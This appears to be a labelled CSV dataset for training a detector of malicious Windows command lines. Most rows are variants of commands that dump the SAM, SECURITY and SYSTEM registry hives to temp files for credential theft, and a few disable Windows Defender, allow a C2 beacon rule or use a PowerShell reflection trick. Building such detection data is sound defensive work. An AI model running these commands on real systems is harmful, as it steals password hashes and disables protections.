text,label
"cmd.exe /c ""reg export hklm\security c:\temp\whxsrpm8.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\pe6ivqb0.dat""",1
reg export hklm\security c:\windows\temp\7p4rjmc1.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\de2veb5q.dat""",1
reg export hklm\system c:\windows\temp\p6ejo54k.save,1
reg save hklm\security c:\windows\temp\2mggniuy.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\p0rghuz5.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\tdezefbk.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\fnjv09qs.dat""",1
reg save hklm\sam c:\windows\temp\h3nedle3.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\8hychv4i.dat""",1
reg export hklm\security c:\windows\temp\3q4iw3xf.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\38rc5htj.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\3xdoridk.dat""",1
backup-utility  save  registry  config,0
"cmd.exe /c ""reg export hklm\sam c:\temp\ao6egavf.dat""",1
"cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\iqgl19ap.dat""",1
"cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\mcy25qoe.dat""",1
reg export hklm\sam c:\windows\temp\xx7225bs.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\g0qwnw60.dat""",1
reg   export   hklm\system   c:\windows\temp\plml2j8b.save,1
reg export hklm\security c:\windows\temp\wro5a6p3.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\e2madzer.dat""",1
reg export hklm\sam c:\windows\temp\d6gifgt4.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\00ewxaps.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\tm2f80kd.dat""",1
reg save hklm\system c:\windows\temp\nmk3r7uh.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\m2bagaue.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\y1w42957.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\4f2ez4r5.dat""",1
reg save hklm\system c:\windows\temp\45b2pug9.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\ao39hd84.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\ioo8pk0s.dat""",1
reg save hklm\security c:\windows\temp\4j8zc6ff.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\vdngl3gj.dat""",1
reg export hklm\system c:\windows\temp\41qzrbqh.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\vjn9x4pv.dat""",1
reg export hklm\system c:\windows\temp\25p9pil2.save,1
reg save hklm\system c:\windows\temp\lorfravw.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\hn2ktf5y.dat""",1
reg save hklm\security c:\windows\temp\208f8k1v.save,1
reg  save  hklm\system  c:\windows\temp\uyr9rffr.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\69gg27nf.dat""",1
reg export hklm\security c:\windows\temp\yrr5imze.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\w77zrxyz.dat""",1
"cmd.exe /c ""sc stop windefend""",2
reg save hklm\sam c:\windows\temp\c1kanjpq.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\ywcvgwrp.dat""",1
"cmd.exe   /c   ""reg   save   hklm\security   c:\temp\wiorbg8z.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\np8owqk0.dat""",1
reg  export  hklm\sam  c:\windows\temp\em247ea2.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\xil71u31.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\3iseiinb.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\vpmnu47g.dat""",1
reg export hklm\security c:\windows\temp\jia0fy16.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\5eddcys9.dat""",1
reg save hklm\security c:\windows\temp\t7ca9ez6.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\uy8832ka.dat""",1
reg save hklm\sam c:\windows\temp\n92vo4x6.save,1
reg export hklm\sam c:\windows\temp\0fxad9us.save,1
reg save hklm\security c:\windows\temp\19qxx8vx.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\ra1encvm.dat""",1
reg export hklm\system c:\windows\temp\99eogpla.save,1
"powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\qjiqveaw.dat""",1
reg export hklm\system c:\windows\temp\pmpf8r0e.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\zmgn9p3z.dat""",1
reg export hklm\sam c:\windows\temp\l43u6aqh.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\fe9mjxv4.dat""",1
reg save hklm\sam c:\windows\temp\q7dv8u0e.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\wqgfve7u.dat""",1
reg save hklm\security c:\windows\temp\69s4hznv.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\hhrhu62q.dat""",1
reg export hklm\system c:\windows\temp\wgctuyt0.save,1
reg save hklm\sam c:\windows\temp\0nqhhq9n.save,1
reg export hklm\security c:\windows\temp\hsaek92f.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\8jeg534d.dat""",1
reg export hklm\system c:\windows\temp\jdrw3npr.save,1
reg save hklm\system c:\windows\temp\hrpb86mc.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\scpw8ys4.dat""",1
reg export hklm\system c:\windows\temp\3et1snt4.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\k0ty36bw.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\ryfh0mna.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\vky3awa0.dat""",1
"powershell -nop -c ""cmd.exe  /c  ""reg  export  hklm\security  c:\temp\e50zf3e0.dat""""",1
reg  save  hklm\sam  c:\windows\temp\oes7nxy6.save,1
reg save hklm\system c:\windows\temp\yoobr7qt.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\pnc59kea.dat""",1
reg save hklm\security c:\windows\temp\0bkrhau8.save,1
reg export hklm\security c:\windows\temp\eg6wzurj.save,1
reg save hklm\system c:\windows\temp\0ndeeghl.save,1
"powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\5ylijjo6.dat""",1
"powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\bg82xwrr.dat""",1
reg export hklm\system c:\windows\temp\ufo1n135.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\eyezmnqn.dat""",1
reg export hklm\system c:\windows\temp\6yi02900.save,1
reg save hklm\sam c:\windows\temp\o5rx9kvm.save,1
"powershell -nop -c ""cmd.exe /c ""reg export hklm\sam c:\temp\lyazl178.dat""""",1
reg export hklm\sam c:\windows\temp\qdukjqce.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\f01sxuln.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\lsslnega.save""",1
reg   save   hklm\system   c:\windows\temp\psthnclb.save,1
reg save hklm\security c:\windows\temp\gj3uy0yp.save,1
"powershell -nop -c ""reg save hklm\security c:\windows\temp\mjkb281i.save""",1
"powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\k28yle5e.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\apnocrq0.dat""",1
reg export hklm\sam c:\windows\temp\cvur6gep.save,1
reg export hklm\security c:\windows\temp\fomoywyo.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\w339xow0.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\himoqcss.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\4cz56jq8.dat""",1
"cmd.exe /c ""reg save hklm\system c:\windows\temp\7s5chk5f.save""",1
reg save hklm\sam c:\windows\temp\71zy67pt.save,1
reg save hklm\system c:\windows\temp\asebd6n5.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\loyaf2o0.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\e7gqrfgo.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\fwkhuk7f.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\cx9ay9gu.dat""",1
"cmd.exe /c ""reg  export  hklm\sam  c:\windows\temp\3b6bk4ou.save""",1
reg export hklm\system c:\windows\temp\kj6m7aro.save,1
reg  save  hklm\sam  c:\windows\temp\7le27yxl.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\nt3u179r.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\mpxg83sg.dat""",1
reg   export   hklm\system   c:\windows\temp\9xkqh0rx.save,1
reg export hklm\sam c:\windows\temp\n13umakh.save,1
"powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\1cbl5o9t.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\st1adkcf.dat""",1
reg save hklm\security c:\windows\temp\jpzvuupk.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\6b64a6xn.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\od2djzqq.dat""",1
reg save hklm\sam c:\windows\temp\o6vsjvi5.save,1
reg export hklm\sam c:\windows\temp\qjbo4ja1.save,1
"cmd.exe /c ""cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\8z7k40lr.dat""""",1
reg export hklm\system c:\windows\temp\bb4us5xw.save,1
reg export hklm\system c:\windows\temp\sfu3pwec.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\dujbpdxv.dat""",1
reg save hklm\system c:\windows\temp\9mlinq6j.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\gjg80xdp.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\hnp7j6dn.dat""",1
reg  save  hklm\security  c:\windows\temp\8kbr6wql.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\it4v9x8p.dat""",1
reg save hklm\system c:\windows\temp\mmwhc0nn.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\4xpkj7xb.dat""",1
reg save hklm\system c:\windows\temp\gxb8b5kv.save,1
reg save hklm\system c:\windows\temp\ykw4lva4.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\dmil6lu3.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\sixlvidv.dat""",1
reg save hklm\system c:\windows\temp\pg5xa5ng.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\zkb8d7at.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\6a85wiou.dat""",1
reg export hklm\security c:\windows\temp\hgml01mm.save,1
reg save hklm\system c:\windows\temp\pjp0jwfb.save,1
reg save hklm\security c:\windows\temp\24zdz7z0.save,1
reg save hklm\security c:\windows\temp\zrtoq43m.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\zqp233x5.dat""",1
reg save hklm\sam c:\windows\temp\aieksi6f.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\1r6qb5sr.dat""",1
reg save hklm\system c:\windows\temp\xrt6cew3.save,1
"cmd.exe   /c   ""reg   save   hklm\security   c:\temp\vnjkt3gh.dat""",1
reg save hklm\sam c:\windows\temp\rn0kziau.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\8y628x0z.dat""",1
"powershell -nop -c ""reg   export   hklm\sam   c:\windows\temp\v6xlxbix.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\dh03etsq.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\ixr66cil.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\jmksjwmc.dat""",1
reg export hklm\security c:\windows\temp\xvml9may.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\iljpakuk.dat""",1
reg export hklm\security c:\windows\temp\q6i0wypf.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\xoylbcze.dat""",1
"cmd.exe /c ""rule:  c2  beacon  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
reg export hklm\system c:\windows\temp\d08r1kri.save,1
reg export hklm\security c:\windows\temp\4qwbckmt.save,1
reg save hklm\sam c:\windows\temp\t6t0be0u.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\o9rj0ubc.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\n9pumgy8.dat""",1
reg export hklm\system c:\windows\temp\9kdn3xh1.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\sryjsqle.dat""",1
reg save hklm\sam c:\windows\temp\xfg204e1.save,1
reg export hklm\security c:\windows\temp\nx4dmyk8.save,1
"powershell -nop -c ""cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\r0krxk4m.dat""""",1
"cmd.exe /c ""reg  export  hklm\security  c:\windows\temp\zqr65cox.save""",1
reg export hklm\system c:\windows\temp\3j5fkefl.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\fdjh36h7.dat""",1
reg export hklm\system c:\windows\temp\wutzix5z.save,1
"cmd.exe /c ""cmd.exe /c ""reg save hklm\security c:\temp\ffs750vr.dat""""",1
reg export hklm\security c:\windows\temp\am01pxms.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\nopit4mc.dat""",1
reg save hklm\security c:\windows\temp\keid1296.save,1
reg save hklm\sam c:\windows\temp\t9fsfjvy.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\50zh141i.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\7ytttbxo.dat""",1
reg save hklm\sam c:\windows\temp\8hj114kn.save,1
reg export hklm\security c:\windows\temp\hm25e50g.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\kpbwabl9.dat""",1
"powershell -nop -c ""reg export hklm\system c:\windows\temp\ff8piotb.save""",1
reg export hklm\sam c:\windows\temp\p8b68a3m.save,1
"cmd.exe /c ""reg   save   hklm\security   c:\windows\temp\9e6k52j3.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\ot61b5vg.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\5k8rkn00.dat""",1
reg save hklm\sam c:\windows\temp\mpcpsd76.save,1
reg save hklm\security c:\windows\temp\rcproiyu.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\3i7ik7c3.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\y0imgs2d.dat""",1
$a   =   [ref].assembly.gettype('system.management.automation.openprocesstoken'),3
"powershell -nop -c ""reg save hklm\sam c:\temp\20vaulpr.dat""",1
reg export hklm\system c:\windows\temp\ii3hkaq6.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\hl9jx0be.dat""",1
"cmd.exe /c ""reg   save   hklm\security   c:\windows\temp\p8szhjmn.save""",1
"powershell -nop -c ""reg export hklm\sam c:\windows\temp\7fdc8s5l.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\9zpsbds5.dat""",1
reg export hklm\sam c:\windows\temp\dq3yshof.save,1
reg save hklm\system c:\windows\temp\8tkn3qup.save,1
"powershell -nop -c ""reg export hklm\security c:\windows\temp\m1wt99i5.save""",1
reg save hklm\sam c:\windows\temp\m2w3vvu6.save,1
reg export hklm\sam c:\windows\temp\myc2ojva.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\xw0cl63u.dat""",1
reg export hklm\system c:\windows\temp\ptshncd5.save,1
"cmd.exe   /c   ""reg   export   hklm\security   c:\temp\94mtz6c8.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\46yeyooq.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\f8ve2cy4.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\5b4z864a.dat""",1
reg save hklm\system c:\windows\temp\fcci4kex.save,1
reg export hklm\sam c:\windows\temp\rum21k4u.save,1
reg save hklm\sam c:\windows\temp\po2h7vwd.save,1
reg export hklm\system c:\windows\temp\gama09dt.save,1
"powershell -nop -c ""powershell -nop -c ""reg export hklm\security c:\temp\n2pt1gvr.dat""""",1
"powershell -nop -c ""reg export hklm\security c:\temp\i4glu006.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\vpjjzjdt.dat""",1
reg save hklm\sam c:\windows\temp\ce1idl0a.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\3792kda0.dat""",1
reg  export  hklm\security  c:\windows\temp\2zgb17k7.save,1
reg save hklm\security c:\windows\temp\v7v630cy.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\7jdgbx5q.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\uz87gi2y.dat""",1
"cmd.exe /c ""reg   export   hklm\sam   c:\windows\temp\mmbgm1lv.save""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\dx2yfrfd.dat""",1
"cmd.exe /c ""powershell -nop -c ""reg save hklm\sam c:\temp\cp6glr0c.dat""""",1
reg save hklm\security c:\windows\temp\x5cy4k71.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\sr7n5bge.dat""",1
reg export hklm\sam c:\windows\temp\9wweic0t.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\q4y1jstc.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\u2zah3r5.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\4fo595hm.dat""",1
reg save hklm\system c:\windows\temp\fa8d1m4g.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\0d9xy7wq.dat""",1
reg export hklm\security c:\windows\temp\l4vi1qvg.save,1
reg export hklm\security c:\windows\temp\zrn3r298.save,1
reg save hklm\security c:\windows\temp\ia5kaw9t.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\fd6kv7dl.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\ljiitgkx.dat""",1
reg save hklm\security c:\windows\temp\d8s662di.save,1
reg save hklm\sam c:\windows\temp\31220pv8.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\1pj9yc6g.dat""",1
"cmd.exe /c ""powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\lzg0lkfw.dat""""",1
reg save hklm\security c:\windows\temp\a5vqak79.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\fps1fs03.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\7w8ev10n.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\dvbbin87.dat""",1
"cmd.exe /c ""powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\my2ysf3s.dat""""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\fdx3bsg8.dat""",1
reg save hklm\system c:\windows\temp\g2nmi1x9.save,1
reg export hklm\security c:\windows\temp\532ohlpn.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\9uukveeu.dat""",1
reg save hklm\system c:\windows\temp\6dfh6zu2.save,1
reg save hklm\security c:\windows\temp\d4huvjdb.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\59ohs7ou.dat""",1
reg export hklm\system c:\windows\temp\bmezompf.save,1
reg save hklm\security c:\windows\temp\a260nvqa.save,1
reg export hklm\sam c:\windows\temp\59l2me7g.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\k77dgbrv.dat""",1
reg save hklm\security c:\windows\temp\xrhub87w.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\jaat6hqd.dat""",1
"powershell -nop -c ""sc   stop   windefend""",2
reg export hklm\security c:\windows\temp\9n9twt0p.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\ptfog02t.dat""",1
"cmd.exe /c ""reg   save   hklm\security   c:\windows\temp\q3grg66u.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\dlyely9h.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\yx2a60cj.dat""",1
reg save hklm\system c:\windows\temp\fwxapfee.save,1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\14wsuvya.dat""",1
reg export hklm\sam c:\windows\temp\aibfjlqi.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\55936axo.dat""",1
reg export hklm\sam c:\windows\temp\sn0fekvq.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\6n9on3gk.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\cd527pcz.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\1b8g5f7m.dat""",1
reg export hklm\sam c:\windows\temp\92esy312.save,1
reg export hklm\security c:\windows\temp\h0i08ysv.save,1
reg save hklm\security c:\windows\temp\k45pezt9.save,1
reg export hklm\security c:\windows\temp\moarnlc9.save,1
reg export hklm\security c:\windows\temp\z878hu5e.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\te7dm5sc.dat""",1
reg save hklm\security c:\windows\temp\9uber5un.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\0pfjz1i1.dat""",1
reg save hklm\security c:\windows\temp\5ikf83jj.save,1
reg save hklm\security c:\windows\temp\1x063z6j.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\ool8rook.dat""",1
reg export hklm\system c:\windows\temp\812hrwfz.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\7o33ayu3.dat""",1
reg export hklm\sam c:\windows\temp\7pcn4p5t.save,1
reg export hklm\security c:\windows\temp\4x8lku9q.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\j7psgntj.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\dyl6nywo.dat""",1
"powershell -nop -c ""powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\opc3z9p4.dat""""",1
"powershell -nop -c ""reg   export   hklm\security   c:\windows\temp\vxjat5b8.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\w5e4s15l.dat""",1
reg export hklm\security c:\windows\temp\5ortie5n.save,1
reg export hklm\sam c:\windows\temp\u6phq3f5.save,1
set-mppreference  -disablerealtimemonitoring  $true,2
reg export hklm\system c:\windows\temp\r3l6r4tu.save,1
reg save hklm\sam c:\windows\temp\te0onpeg.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\cyxeegdx.dat""",1
reg export hklm\system c:\windows\temp\3nft3hrl.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\mrxoq3t4.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\izcpaxmr.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\11vn7alm.dat""",1
reg save hklm\sam c:\windows\temp\ilopmeqe.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\48lv19o3.dat""",1
"cmd.exe  /c  ""reg  export  hklm\security  c:\temp\xi8l8gwy.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\gziivbda.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\nw2non6w.dat""",1
reg save hklm\security c:\windows\temp\cpkaqpt9.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\jldf8s48.dat""",1
reg save hklm\system c:\windows\temp\5kecdi15.save,1
reg save hklm\system c:\windows\temp\tw0jdmpc.save,1
